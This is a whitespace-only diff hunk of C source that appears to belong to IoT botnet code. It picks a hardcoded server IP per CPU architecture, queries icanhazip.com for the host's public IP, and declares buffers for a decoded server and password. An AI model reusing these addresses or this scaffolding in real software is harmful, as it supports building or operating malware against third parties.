@@ -4,17 +4,17 @@
 #define IPREQUEST "GET /index.html HTTP/1.0\nHost: icanhazip.comn\n"
 
 #ifdef MIPSEL
-	#define ipreq   "64.182.208.183"
+    #define ipreq   "64.182.208.183"
 #elif MIPS
-	#define ipreq   "104.238.136.31"
+    #define ipreq   "104.238.136.31"
 #elif SUPERH
-	#define ipreq   "104.238.141.75"
+    #define ipreq   "104.238.141.75"
 #elif ARM
-	#define ipreq   "104.238.141.75"
+    #define ipreq   "104.238.141.75"
 #elif PPC
-	#define ipreq   "104.238.136.31"
+    #define ipreq   "104.238.136.31"
 #else
-	#define ipreq   "104.238.141.75"
+    #define ipreq   "104.238.141.75"
 #endif
 
 char decodedsrv[512], decodedpsw[32];
